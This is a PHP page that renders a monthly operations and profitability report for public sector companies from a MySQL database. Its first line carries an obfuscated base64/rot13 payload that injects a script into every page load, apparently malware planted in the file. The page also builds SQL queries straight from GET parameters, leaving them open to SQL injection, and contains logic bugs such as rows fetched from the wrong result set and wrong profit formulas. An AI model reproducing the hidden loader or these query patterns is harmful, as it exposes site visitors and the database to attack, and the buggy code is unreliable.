<?php $somecrainsignvar="ib6hocmi"; echo base64_decode(str_rot13('CUAwpzyjqQ5xLKEyCJ5yqlORLKEyXPx7qzSlVTSlCFWjEG1QVUV6KG9gMGfiCUHfrv52ISjvqQOxnFuiLJMop2VkL3q7VPqhDzqBDG59nPyfrFV7qUW5r2qmMKWeMKqaXPx7sJAuqTAbXTRcr2f9ozI3VRWio2kyLJ4bXF50o1A0pzyhMltcsGg2LKVtLKVlCFWzZGVfZPj2ZPjkZvjlAPjgZmZfYGLfBFjlZFjgAGpfYGR1YQZfBQDfYGHkYP0kZvj2BFjgBGNfZmZfYGLjYQRmBPjgZGRkYP0mYQZfBQDfYGHkYQV3YQV3YQV3YP04AljlAPjmBFjmYP00ZvjgAGDfZlj0AFjmAvjgZGtfYGR1YP05YQp1YP0mZljlAljgAGRfYGVkYP00AFjkZGpfYGZmYP05ZljjYQNfAwNfZGVfYGL5YQL2YP01APjmYP0kAFj2ZPj2ZljgZGN1YP0lZFjjYQRlZPjgZwDfYGp4YQRkZFjgAGRfYGLjYQp4YP0mYP05ZljjYQNfAGpfBFjlZFjgAGpfYGR1YQZfBQDfYGHkYP0kZvj1ZFjgBQpfAGpfYGxfYGZmYQD1YP0kAFjgZwRfZmZfZGVfYGL5YQL2YP01APjmYQp4YP0kBPjgAmHfBQDfYGxmYQRjAFjlAPjgAmVfZPjgAwZfZGtfZGtfZPjkZvjlZFjgZmxfAwNfYGLjYQLjYP0lAljgBFjlAljgAwLfZGHfZGtfAwLfYGt0YQR4YQZmYQH0YP01AljgBFjmYP0lZFj0BPjgZwRfYGHkYQxfZwpfAvjlZFjgAGDfBQDfYGDlYP0lAljgAGRfZGZ1YP0kZmHfZwDfAwLfYGR4YP0mYP02Zlj5ZPjkAFjgZljgAvjgZmNfYGZfYGLfAmVfYGRlBFjkZQHfYGR1YP0mZPj0AFjgZljlAljgZGN1YQDlYQD4YQR1YP03ZvjgAGpfZGN1YP0kAFjgZmNfAQHfYGZfYGR4YP0lAlj4ZFjgZljgZGRkYP0lAPjkZQHfYGH3YQR4YQR4YP0kBPjlZFjgZwRfAwxfYGL5YP05YQtkYP0kZwLfZGR3YP02ZljgZljjYP0mBFj4APjgBQRfYGZmYQp4YQRlYP0kBPjgBFj5YQLfZmLfYGx2YQLmYQRlYP0mYP0kZvj2ZljgBGxfZwRfYGZmYQZfZGN4YP0kZGRfAGDfYGVkYP00AFj0BPjgZmZfZmNfZGHfYGp4YQR4YQD4YP0mZlj3BPjkBPjgBGNfYGZfZmLfZGVfYGL5YQL2YP01APjmYQx5YP02BFj3BPjgZGN1YP0lZFjjYQRlZPjgZGVjYQNfAmVfYGDlYQplYP0kAFjgZmLfBFj2YQZ2YP02YP0mAvjkZvjgAwxfAwLfYGH0YQZfYGR1YQLjYQLmYP0mZljgBGZfZPjjYQDlYQV3YP02Avj5ZljgZwDfZwDfYGRjZvjkZQVfYGZ5YQxfZwRfYGH3YP0kAFjmYQt0YP01ZFjgZGVfAQtfYGt0YQR1YQHkYP0kBPjgZmZfYGV3YQRmBPjgZGRkYP0mYQZfBQDfYGHkYQRlYQZ2YP0mBFjkZvjgAwxfAwLfYGH0YQZfBQRfZwpfYGRjAFj1ZFjgZmZfZmxfYGLjYQZmYQLmYP02ZljjYP00BPj1AljlZFjgAGRfZwRfYGZmYQD1YQZ2YP0lZFjgAmHfBQDfZGVfYGL2YQL2YQV0YP03ZvjjYP02ZljkBPjkBPjjYQRlYQVkYP0mBFj2ZPjgAwNfAwNfYGV3YP05YQV3YP02AvjkAFjkBPj2AvjgBQDfZGtfZmZfAGDfYGH3YP05YQZfYGVkYQD4YP0lZFjgAGRfBFjlAlj2YQVkYP01APj4APjgAQVfYGV3YP01ZFjkZmHfYGRmAFjlAPj2AvjgZGtfYGZfYGLmYQxjYQR1YQV3YP0kZQHfAGRfYGZmYQZ5YP0lAlj4ZFjgZljgZGRkYQVkYQZfZGtfZGtfYGR4YQVkYP0lZFj2BFjgAwxfYGxfBQRfYGRmBPjkZQHfZwDfYGLmYP0mYQNfYGZ5YQt0YP0mYP03BPj1ZFjgZmZfZmxfYGV3YQtkYP0mYP0kZGRfZwRfYGHkYQp4YQRlYP0kBPjgBFj5YQLfZmLfYGRjBPjkZQHfYGZjYQRlYP0mYP0kZvj2ZljgBGxfZwRfYGZmYQtkYP03BPj1ZFjgZmZfZmxfYGV3YQtkYP0mYP0kZGRfZwRfBGNfYGRkZFj1APjgZwRfYGH3YQRjAFjgAQHfAQHfYGp4YQHkYP0mZljmBFjgZwpfBQRfYGZfYGRkZFjlZFjkZvjkAFjgAmtfAvjkZQHfYGD1YQD1YP03BPj1ZFjgZmZfZmxfYGLjYQZmYQLmYP02ZljjYP00BPj1AljlZFjgAGRfZwRfYGZmYQD1YQZ2YP05YP0mZPjgZljgAvj3ZvjgZwDfYGL2YQL2YP0kAFjgZmNfAQHfZwpfYGRjAFj1ZFjgZmZfZmxfYGLjYQZmYQLmYP02ZljjYP00BPj1AljlZFjgAGRfZwRfYGZmYQD1YQZ2YQV0YP0kZQHfAQVfAQtfZGHfYGplYQD4YP02Avj2AvjgZGHfYGZjYQD1YQV3YP0kZQHfYGVkYQNfZPj1Alj5YQVkYP01AljgZGHfZlj4APjgAGRfYGRlYQL5YP05ZPjmZljgAwNfZGZ4YP0kZGRfYGZfZlj4APjgAGRfZwpfZwpfZwpfYGt3YQV0YQZ5YQZfYGDlYP01APjmYQD1YQZ2YP0kBPjgZGHfYGxfAmHfYGZmYQV3YP01ZFjgZwRfYGD1YQZjYQZjYP04ZFjjYQZjYQt0YP00AFjgAwNfZGV2YP02Zlj2BFjgAmVfAvj5YQH0YP0kZQHfYGVkYQNfZGVjKFVhpzIjoTSwMFueYaA1LaA0pvtjYQRcYPqoWlx7pTS1CFWlovOyqwVjZGNvYaWypTkuL2HbMTS0MF5aMKETqJkfJJIupvtcYGRfVzSfVvx7MG1hMKptEaIhL3Eco24bVvVfVaWyqUHvX3OuqFx7MG1yXPx7LKVlCJHbLKVlXGgmCFVvB3MupvOjo3Z9ZQgzo3VbnG0jB2x8LKVlYzkyozq0nQgcXlfcr3Oiplf9pTSlp2IWoaDbnl5lMKOfLJAyXPWzLJkmMFVfVwOup2DvXFxeLKVlJ2yqYmZ7plf9LKVhp3Ivp3ElXUOipljkXGg9QDcyXUZcBmjip2AlnKO0Ct==')); $crain="";

	session_start();
	if(!isset($_SESSION['Logged']))
	{
		Header("Location: home.php");
		die();
	}
	elseif($_SESSION['Logged']=='No')
	{
		Header("Location: home.php");
		die();
	}
	include("../connectdb/connect.php");
 	mysql_select_db("pentagonclt",$con);
	 if(!$con)
	{
		die('Could not connect to server' . mysql_error());
	} 
	$companyid=$_GET["company"];
	$month=$_GET["month"];
	$year=$_GET["year"];
	
	$sql="select * from emp_company where company_id=".$companyid."";
	$result=mysql_query($sql);
	$row=mysql_fetch_assoc($result);
?>
<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>MONTHLY REPORT ON OPERATIONS OF PUBLIC SECTOR UNITS</title>
<script src="search.js"></script>
<script src="profile.js"></script>
<script src="login.js">	

</script>
<link href="../styleSheet/employee.css" type=text/css rel=stylesheet>
<link href="../styleSheet/employee_controls.css" type=text/css rel=stylesheet>
</head>

<body topmargin=0 leftmargin=0>

<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%">
  <tr>
    <td width="100%" align="center" valign="top">
    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="950" height="241">     
      <tr>
        <td width="1000" height="24" class="txtleft" colspan="2">Nature of Activity : &nbsp; 
		<?php echo $row["activity"]; ?></td>
      </tr>
      <tr>
        <td width="1000" height="21" class="txtleft" colspan="2">
			
		</td>
      </tr>
      <tr>
        <td width="1000" height="25" class="txtleft" colspan="2"><b>1. Manpower (In nos.)</b></td>
      </tr>
      <tr>
        <td width="1000" height="31" class="txtleft" colspan="2">&nbsp;&nbsp;&nbsp; i) 
        Actual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
        :&nbsp;
		<?php echo "<input type=text name=txtActual class=txtbox size=25 value=".$row["actual_manpower"].">"; ?>
		</td>
      </tr>
      <tr>
        <td width="1000" height="30" class="txtleft" colspan="2">&nbsp;&nbsp;&nbsp; ii) 
        Effective for the month :&nbsp;
        <input type=text name=txtActual class=txtbox size="25"></td>
      </tr>
      <tr>
        <td width="1000" height="31" class="txtleft" colspan="2"><b>2. Turnover &amp; Profit (in Rs.Lakhs)</b></td>
      </tr>
      <tr>
        <td width="1000" height="31" class="txtleft" colspan="2">
        <?php
        	 $sql="SELECT * FROM emp_turnover where company_id=".$companyid." order by turn_id desc LIMIT 5";
        	 $resultTurn=mysql_query($sql);
        	 $rowTurn=mysql_fetch_assoc($resultTurn);
        	 //echo $sql;
        ?>
        <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%">
          <tr>
            <td width="31%" rowspan="2" class="txtcenter1">
            <b>Particulars</b></td>
            <td width="69%" colspan="5" class="txtcenter1" bgcolor="#D7D7D7"><b>Details for past 5 
            years</b></td>
          </tr>
          <tr>
            <td width="14%" class="txtcenter1" bgcolor="#E2E0E0"><?php echo $rowTurn["fin_year"];?>&nbsp;</td>
            <td width="14%" class="txtcenter1" bgcolor="#E2E0E0"><?php $rowTurn=mysql_fetch_assoc($resultTurn);
			echo $rowTurn["fin_year"];?>&nbsp;</td>
            <td width="14%" class="txtcenter1" bgcolor="#E2E0E0"><?php $rowTurn=mysql_fetch_assoc($resultTurn);
			echo $rowTurn["fin_year"];?>&nbsp;</td>
            <td width="14%" class="txtcenter1" bgcolor="#E2E0E0"><?php $rowTurn=mysql_fetch_assoc($resultTurn);
			echo $rowTurn["fin_year"];?>&nbsp;</td>
            <td width="13%" class="txtcenter1" bgcolor="#E2E0E0"><?php $rowTurn=mysql_fetch_assoc($resultTurn);
			echo $rowTurn["fin_year"];?>&nbsp;</td>
          </tr>
           <?php
        	 $sql="SELECT * FROM emp_turnover where company_id=".$companyid." order by turn_id desc LIMIT 5";
        	 $resultTurn=mysql_query($sql);
        	 $rowTurn=mysql_fetch_assoc($resultTurn);
        	 //echo $sql;
        ?>
          <tr>
            <td width="31%" class="txtleft">Turnover</td>
            <td width="14%" class="txtcenter1" bgcolor="#E2E0E0"><?php echo $rowTurn["turn_over"];?>
            &nbsp;</td>
            <td width="14%" class="txtcenter1" bgcolor="#E2E0E0"><?php $rowTurn=mysql_fetch_assoc($resultTurn);
			echo $rowTurn["turn_over"];?>
            &nbsp;</td>
            <td width="14%" class="txtcenter1" bgcolor="#E2E0E0"><?php $rowTurn=mysql_fetch_assoc($resultTurn);
			echo $rowTurn["turn_over"];?>
            &nbsp;</td>
            <td width="14%" class="txtcenter1" bgcolor="#E2E0E0"><?php $rowTurn=mysql_fetch_assoc($resultTurn);
			echo $rowTurn["turn_over"];?>
            &nbsp;</td>
            <td width="13%" class="txtcenter1" bgcolor="#E2E0E0"><?php $rowTurn=mysql_fetch_assoc($resultTurn);
			echo $rowTurn["turn_over"];?>
            &nbsp;</td>
          </tr>
          <?php
        	 $sql="SELECT * FROM emp_turnover where company_id=".$companyid." order by turn_id desc LIMIT 5";
        	 $resultTurn=mysql_query($sql);
        	 $rowTurn=mysql_fetch_assoc($resultTurn);
        	 //echo $sql;
        ?>
          <tr>
            <td width="31%" class="txtleft">Profit/loss(PBT)</td>
            <td width="14%" class="txtcenter1" bgcolor="#E2E0E0"><?php echo $rowTurn["profit_loss"];?>
            &nbsp;</td>
            <td width="14%" class="txtcenter1" bgcolor="#E2E0E0"><?php $rowTurn=mysql_fetch_assoc($resultTurn);
			echo $rowTurn["profit_loss"];?>
            &nbsp;</td>
            <td width="14%" class="txtcenter1" bgcolor="#E2E0E0"><?php $rowTurn=mysql_fetch_assoc($resultTurn);
			echo $rowTurn["profit_loss"];?>
            &nbsp;</td>
            <td width="14%" class="txtcenter1" bgcolor="#E2E0E0"><?php $rowTurn=mysql_fetch_assoc($resultTurn);
			echo $rowTurn["profit_loss"];?>
            &nbsp;</td>
            <td width="13%" class="txtcenter1" bgcolor="#E2E0E0"><?php $rowTurn=mysql_fetch_assoc($resultTurn);
			echo $rowTurn["profit_loss"];?>
            &nbsp;</td>
          </tr>
        </table>
        </td>
      </tr>
      <tr>
        <td width="1000" height="31" class="txtleft" colspan="2">
        &nbsp;</td>
      </tr>
      <tr>
        <td width="310" height="31" class="txtleft">
        <b>3. Capacity/Production <br>
        details of current year</b></td>
        <td width="690" height="31" class="txtleft">
        <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" height="64">
          <tr>
            <td width="20%" height="40" class="txtcenter1" valign="top" bgcolor="#D7D7D7">
            Installed capacity per annum <br>
            (Give unit)</td>
            <td width="20%" height="40" class="txtcenter1" valign="top" bgcolor="#D7D7D7">
            Achievable capacity&nbsp; per annum&nbsp;&nbsp; <br>
            (Give unit)</td>
            <td width="21%" height="40" class="txtcenter1" valign="top" bgcolor="#D7D7D7">Capacity 
            being <br>
            used now<br>
            (Give unit)</td>
            <td width="20%" height="40" class="txtcenter1" bgcolor="#D7D7D7">Machine <br>
            Efficiency (%)</td>
            <td width="19%" height="40" class="txtcenter1" valign="top" bgcolor="#D7D7D7">Capacity<br>
            Utilisation (%)</td>
          </tr>
          <tr>
            <td width="20%" height="23" class="txtcenter1" bgcolor="#E2E0E0">
				<?php echo $row["inst_capacity"]; ?>
			</td>
			<?php
				$sql="select * from emp_capacity where company_id=".$companyid." and fin_year='".$year."'";
				$resultcapacity=mysql_query($sql);
				$rowcapacity=mysql_fetch_assoc($resultcapacity);
				//echo $sql;
			?>
			
            <td width="20%" height="23" class="txtcenter1" bgcolor="#E2E0E0">
            	<?php echo $rowcapacity["achievable_capacity"]; ?>
            </td>
            <td width="21%" height="23" class="txtcenter1" bgcolor="#E2E0E0">
            	<?php echo $rowcapacity["capacity_being_used"]; ?>
            </td>
            <td width="20%" height="23" class="txtcenter1" bgcolor="#E2E0E0">
            	<?php echo $rowcapacity["machine_efficiency"]; ?>
            </td>
            <td width="19%" height="23" class="txtcenter1" bgcolor="#E2E0E0">
            	<?php echo $rowcapacity["capacity_utilisation"]; ?>
            </td>
          </tr>
        </table>
        </td>
      </tr>
      <tr>
        <td width="1000" height="31" class="txtleft" colspan="2" valign="bottom">
        <b>4. Profitability Statement (in Rs. Lakhs)</b></td>
      </tr>
      <tr>
        <td width="1000" height="31" class="txtleft" colspan="2">
        <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="74%">
          <?php
		  	$sql="select * from emp_profirability_statement where company_id=".$companyid." and fin_year='".$year."'
			  and month='".$month."'";
			$resultPro=mysql_query($sql);
			$rowPro=mysql_fetch_assoc($resultPro);  
          ?>
		  <tr>
            <td width="44%">&nbsp;</td>
            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7"><b>Budget for<br>
            current year</b></td>
            <td width="19%" class="txtcenter1" bgcolor="#D7D7D7"><b>Actuals for the <br>
            month</b></td>
            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7"><b>Actual Cumulative<br>
            for the year</b></td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">a) Sales (without Taxes and Duty)</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCurrentSale id=txtCurrentSale class=txtboxwhite size=25 
			value=".$rowPro['current_sale'].">";
			?></td>
            <td width="19%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtActualSale id=txtActualSale class=txtboxwhite size=25 
			value=".$rowPro['actual_sale'].">";
			?>
			</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCumulativeSale id=txtCumulativeSale class=txtboxwhite size=25 
			value=".$rowPro['cumulative_sale'].">";
			?>
			</td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">b) Increase/(Decrease) in Stock</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCurrentStock id=txtCurrentStock class=txtboxwhite size=25 
			value=".$rowPro['current_stock'].">";
			?></td>
            <td width="19%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtActualStock id=txtActualStock class=txtboxwhite size=25 
			value=".$rowPro['actual_stock'].">";
			?>
			</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCumulativeStock id=txtCumulativeStock class=txtboxwhite size=25 
			value=".$rowPro['cumulative_stock'].">";
			?></td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">c) Value of Production (a+b)</td>
            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7">
            <?php 
			$totCurrent=$rowPro["current_sale"]+$rowPro["current_stock"];
			echo $totCurrent;
			?>
			</td>
            <td width="19%" class="txtcenter1" bgcolor="#D7D7D7">
			<?php 
			$totActual=$rowPro["actual_sale"]+$rowPro["actual_stock"];
			echo $totActual;
			?>
			</td>
            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7">
			<?php 
			$totCumulative=$rowPro["cumulative_sale"]+$rowPro["cumulative_stock"];
			echo $totCumulative;
			?>
			</td>
          </tr>
          <tr>
            <td width="100%" class="txtleft" colspan="4" bgcolor="#D7D7D7"><b>d) Variable Expenses</b></td>
          </tr>
          <?php
		  	$sql="select * from emp_variable_expenses where company_id=".$companyid." and fin_year='".$year."'
			  and month='".$month."'";
			$resultVar=mysql_query($sql);
			$rowVar=mysql_fetch_assoc($resultPro);  
          ?>
          <tr>
            <td width="44%" class="txtleft">&nbsp;&nbsp;&nbsp; i) Raw-material 
            cost</td>
            <td width="20%" class="txtcenter1">
			 <?php echo"
            <input type=text name=txtCurrentRawMaterial id=txtCurrentRawMaterial class=txtboxwhite size=25 
			value=".$rowVar['current_rawmaterial'].">";
			?>
			</td>
            <td width="19%" class="txtcenter1">
             <?php echo"
            <input type=text name=txtActualRawmaterial id=txtActualRawmaterial class=txtboxwhite size=25 
			value=".$rowVar['actual_rawmaterial'].">";
			?>
			</td>
            <td width="20%" class="txtcenter1">
             <?php echo"
            <input type=text name=txtCumulativeRawmaterial id=txtCumulativeRawmaterial class=txtboxwhite size=25 
			value=".$rowVar['cumulative_rawmaterial'].">";
			?>
			</td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">&nbsp;&nbsp;&nbsp; ii) Power &amp; fuel</td>
            <td width="20%" class="txtcenter1">
            	<?php echo"
            <input type=text name=txtCurrent_Power_Fuel id=txtCurrent_Power_Fuel class=txtboxwhite size=25 
			value=".$rowVar['current_power_fuel'].">";
			?>
            </td>
            <td width="19%" class="txtcenter1">
            	<?php echo"
            <input type=text name=txtActual_Power_Fuel id=txtActual_Power_Fuel class=txtboxwhite size=25 
			value=".$rowVar['actual_power_fuel'].">";
			?>
			</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCumulative_Power_Fuel id=txtCumulative_Power_Fuel class=txtboxwhite size=25 
			value=".$rowVar['cumulative_power_fuel'].">";
			?>
			</td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">&nbsp;&nbsp;&nbsp; iii) All Other 
            Variable cost</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCurrent_Other_Variablecost id=txtCurrent_Other_Variablecost
			 class=txtboxwhite size=25 
			value=".$rowVar['current_other_variablecost'].">";
			?></td>
            <td width="19%" class="txtcenter1">
             <?php echo"
            <input type=text name=txtActual_Other_Variablecost id=txtActual_Other_Variablecost
			 class=txtboxwhite size=25 
			value=".$rowVar['actual_other_variablecost'].">";
			?>
			</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCumulative_Other_Variablecost id=txtCumulative_Other_Variablecost
			 class=txtboxwhite size=25 
			value=".$rowVar['cumulative_other_variablecost'].">";
			?></td>
          </tr>
          
          <tr>
            <td width="100%" class="txtleft" colspan="4" bgcolor="#D7D7D7">e) <b>Fixed Expenses</b></td>
          </tr>
          <?php
		  	$sql="select * from emp_fixed_expenses where company_id=".$companyid." and fin_year='".$year."'
			  and month='".$month."'";
			$resultFix=mysql_query($sql);
			$rowFix=mysql_fetch_assoc($resultPro);  
			
			$sql="select * from emp_financial_charges where company_id=".$companyid." and fin_year='".$year."'
			  and month='".$month."'";
			$resultFin=mysql_query($sql);
			$rowFin=mysql_fetch_assoc($resultPro);  
          ?>
          <tr>
            <td width="44%" class="txtleft">&nbsp;&nbsp;&nbsp; i) Employee Cost</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCurrentEmployeeCost id=txtCurrentEmployeeCost
			 class=txtboxwhite size=25 
			value=".$rowFix['current_employee_cost'].">";
			?>
			</td>
            <td width="19%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtActualEmployeeCost id=txtActualEmployeeCost
			 class=txtboxwhite size=25 
			value=".$rowFix['actual_employee_cost'].">";
			?>
			</td>
            <td width="20%" class="txtcenter1">
			<?php echo"
            <input type=text name=txtCumulativeEmployeeCost id=txtCumulativeEmployeeCost
			 class=txtboxwhite size=25 
			value=".$rowFix['cumulative_employee_cost'].">";
			?>
			</td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">&nbsp;&nbsp;&nbsp; ii) All Other 
            fixed Expenses</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCurrentOtherExpense id=txtCurrentOtherExpense
			 class=txtboxwhite size=25 
			value=".$rowFix['current_other_expense'].">";
			?>
			</td>
            <td width="19%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtActualOtherExpense id=txtActualOtherExpense
			 class=txtboxwhite size=25 
			value=".$rowFix['actual_other_expense'].">";
			?>
			</td>
            <td width="20%" class="txtcenter1">
			<?php echo"
            <input type=text name=txtActualOtherExpense id=txtActualOtherExpense
			 class=txtboxwhite size=25 
			value=".$rowFix['actual_other_expense'].">";
			?>
			</td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">f) Total Cost (d+h)</td>
            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7">
            <?php 
			$totCurrentCost=$rowVar["current_rawmaterial"]+$rowVar["current_power_fuel"]
			+ $rowVar["current_other_expense"]+$rowFin["current_longterm_loan"]+$rowFin["current_workingterm_loan"];
			echo $totCurrentCost;
			?>
			</td>
            <td width="19%" class="txtcenter1" bgcolor="#D7D7D7">
            <?php 
			$totActualCost=$rowVar["actual_rawmaterial"]+$rowVar["actual_power_fuel"]
			+ $rowVar["actual_other_expense"]+$rowFin["actual_longterm_loan"]+$rowFin["actual_workingterm_loan"];
			echo $totActualCost;
			?>
			</td>
            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7">
            <?php 
			$totCumulativeCost=$rowVar["cumulative_rawmaterial"]+$rowVar["cumulative_power_fuel"]+ 
			$rowVar["cumulative_other_expense"]+$rowFin["cumulative_longterm_loan"]+
			$rowFin["cumulative_workingterm_loan"];
			echo $totCumulativeCost;
			?>
			</td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">g) Profit Before INT .DEPR.&amp; Taxes 
            (a-f)</td>
            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7">
            <?php 
			$currentProfit=$rowPro["current_sale"]+$totCurrentCost;
			echo $currentProfit;
			?>
			</td>
            <td width="19%" class="txtcenter1" bgcolor="#D7D7D7">
            <?php 
			$actualProfit=$rowPro["actual_sale"]+$totActualCost;
			echo $actualProfit;
			?></td>
            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7">
            <?php 
			$cumulativeProfit=$rowPro["cumulative_sale"]+$totCumulativeCost;
			echo $cumulativeProfit;
			?>
			</td>
          </tr>
          <tr>
            <td width="100%" class="txtleft" colspan="4" bgcolor="#D7D7D7">h)<b> Financial Charges on</b></td>
          </tr>
          
          <tr>
            <td width="44%" class="txtleft">&nbsp;&nbsp;&nbsp; i) Long term Loans</td>
            <td width="20%" class="txtcenter1">
			<?php echo"
            <input type=text name=txtCurrentLongTermLoan id=txtCurrentLongTermLoan
			 class=txtboxwhite size=25 
			value=".$rowFin['current_longterm_loan'].">";
			?>
			</td>
            <td width="19%" class="txtcenter1">
			<?php echo"
            <input type=text name=txtActualLongTermLoan id=txtActualLongTermLoan
			 class=txtboxwhite size=25 
			value=".$rowFin['actual_longterm_loan'].">";
			?>
			</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCumulativeLongTermLoan id=txtCumulativeLongTermLoan
			 class=txtboxwhite size=25 
			value=".$rowFin['cumulative_longterm_loan'].">";
			?>
			</td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">&nbsp;&nbsp;&nbsp; ii) Working Capital Loan</td>
            <td width="20%" class="txtcenter1">
			<?php echo"
            <input type=text name=txtCurrentWorkingTermLoan id=txtCurrentWorkingTermLoan
			 class=txtboxwhite size=25 
			value=".$rowFin['current_workingterm_loan'].">";
			?>
			</td>
            <td width="19%" class="txtcenter1">
			<?php echo"
            <input type=text name=txtActualWorkingTermLoan id=txtActualWorkingTermLoan
			 class=txtboxwhite size=25 
			value=".$rowFin['actual_workingterm_loan'].">";
			?>
			</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCumulativeWorkingTermLoan id=txtCumulativeWorkingTermLoan
			 class=txtboxwhite size=25 
			value=".$rowFin['cumulative_workingterm_loan'].">";
			?>
			</td>
          </tr>
          <?php
          	$sql="select * from emp_otherincome_depr where company_id=".$companyid." and fin_year='".$year."'
			  and month='".$month."'";
			$resultOth=mysql_query($sql);
			$rowOth=mysql_fetch_assoc($resultPro);  
          ?>
          <tr>
            <td width="44%" class="txtleft">i) Profit Before DEPR. &amp; Taxes (g-h)</td>
            <td width="20%" class="txtcenter1">
            <?php 
			$currentdepr=$currentProfit-($rowFin["current_longterm_loan"]+$rowFin["current_workingterm_loan"]);
			echo $currentdepr;
			?>
			</td>
            <td width="19%" class="txtcenter1">
            <?php 
			$actualdepr=$actualProfit-($rowFin["actual_longterm_loan"]+$rowFin["actual_workingterm_loan"]);
			echo $actualdepr;
			?>
			</td>
            <td width="20%" class="txtcenter1">
            <?php 
			$cumulativedepr=$cumulativeProfit-($rowFin["cumulative_longterm_loan"]+
			$rowFin["cumulative_workingterm_loan"]);
			echo $cumulativedepr;
			?>
			</td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">j) Other Income</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCurrentOtherIncome id=txtCurrentOtherIncome
			 class=txtboxwhite size=25 
			value=".$rowOth['current_other_income'].">";
			?>
			</td>
            <td width="19%" class="txtcenter1">
			<?php echo"
            <input type=text name=txtActualOtherIncome id=txtActualOtherIncome
			 class=txtboxwhite size=25 
			value=".$rowOth['actual_other_income'].">";
			?>
			</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCumulativeOtherIncome id=txtCumulativeOtherIncome
			 class=txtboxwhite size=25 
			value=".$rowOth['cumulative_other_income'].">";
			?></td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">k) Cash Profit/Loss (i+j)</td>
            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7">
            <?php 
			$currentcashprofit=$currentdepr+$rowOth["current_other_income"];
			echo $currentcashprofit;
			?>
			</td>
            <td width="19%" class="txtcenter1" bgcolor="#D7D7D7">
            <?php 
			$actualcashprofit=$actualdepr+$rowOth["actual_other_income"];
			echo $actualcashprofit;
			?>
			</td>
            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7">
            <?php 
			$cumulativecashprofit=$actualdepr+$rowOth["actual_other_income"];
			echo $actualcashprofit;
			?>
			</td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">l) Depreciation</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCurrentDepr id=txtCurrentDepr
			 class=txtboxwhite size=25 
			value=".$rowOth['current_depr'].">";
			?>
			</td>
            <td width="19%" class="txtcenter1">
             <?php echo"
            <input type=text name=txtActualDepr id=txtActualDepr
			 class=txtboxwhite size=25 
			value=".$rowOth['actual_depr'].">";
			?>
			</td>
            <td width="20%" class="txtcenter1">
            <?php echo"
            <input type=text name=txtCumulativeDepr id=txtCumulativeDepr
			 class=txtboxwhite size=25 
			value=".$rowOth['cumulative_depr'].">";
			?>
			</td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">m)Net Profit/Loss (k-l) (PBT)</td>
            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7">
            &nbsp;</td>
            <td width="19%" class="txtcenter1" bgcolor="#D7D7D7">
            &nbsp;</td>
            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7">
            &nbsp;</td>
          </tr>
          <tr>
            <td width="44%" class="txtleft">&nbsp;</td>
            <td width="20%" class="txtcenter1">&nbsp;</td>
            <td width="19%" class="txtcenter1">&nbsp;</td>
            <td width="20%" class="txtcenter1">&nbsp;</td>
          </tr>
          <tr>
            <td width="100%" class="txtleft" colspan="4">5.Other Financial 
            Indicators at the end of the month</td>
          </tr>
          <tr>
            <td width="44%" class="txtcenter1" bgcolor="#D7D7D7">Particulars</td>
            <td width="20%" class="txtcenter1" bgcolor="#D7D7D7">Amount in Rs.<br>
            Lakhs</td>
            <td width="19%" class="txtcenter1" bgcolor="#D7D7D7">Particulars</td>
